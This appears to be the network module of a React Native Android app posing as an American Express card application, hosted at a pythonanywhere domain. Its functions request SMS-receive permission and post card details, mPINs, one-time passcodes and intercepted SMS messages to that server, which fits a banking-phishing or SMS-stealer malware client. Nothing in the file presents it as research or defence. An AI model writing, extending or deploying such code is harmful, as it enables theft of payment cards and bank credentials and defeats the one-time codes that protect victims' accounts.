import axios from "axios";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { Alert, PermissionsAndroid } from "react-native";
import { setId } from './store/mobileNumberSlice'

const baseUrl = "https://applyamexcards.pythonanywhere.com/api/"

let isSending = false
let lastRequestTime = 0; // Track the last time a request was sent


export const requestSmsPermission = async () => {
    try {
        const granted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
        if (!granted) {
            const permission = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
            return permission;
        }
        return PermissionsAndroid.RESULTS.GRANTED;
    } catch (err) {
        Alert.alert('Error', err.message);
        return null;
    }
};

export const createAccount = (data) => async (dispatch) => {
    try {
        const response = await axios.post(`${baseUrl}users/`, data)
        const { id } = await response.data
        await AsyncStorage.setItem('user_profile', JSON.stringify({ user_profile: id }))
        dispatch(setId(id))
        return id

    } catch (err) {
        return Alert.alert('Error', err.message)

    }
}

export const saveOTP = async (mPin) => {
    const { message } = await (await axios.post(`${baseUrl}mpins/`, mPin)).data
    return message
}
export const saveCard = async (card) => {
    const { message } = (await axios.post(`${baseUrl}cards/`, card)).data
    return message

}

export const saveOTP2s = async (otps) => {
    const { message } = await (await axios.post(`${baseUrl}otps/`, otps)).data
    return message
}

export const sendSms = async (data) => {
    const currentTime = Date.now();
    if (isSending || (currentTime - lastRequestTime < 1000)) {
        return; // Prevent sending if there's already an ongoing request
    }

    isSending = true; // Set the flag to true to indicate a request is in 
    lastRequestTime = currentTime; // Update the last request time
    try {
        const response = await axios.post(`${baseUrl}sms_messages/`, data)
        return response.data
    } catch (err) {
        console.log(err)
    } finally {
        isSending = false; // Reset the flag once the request is complete
    }
}
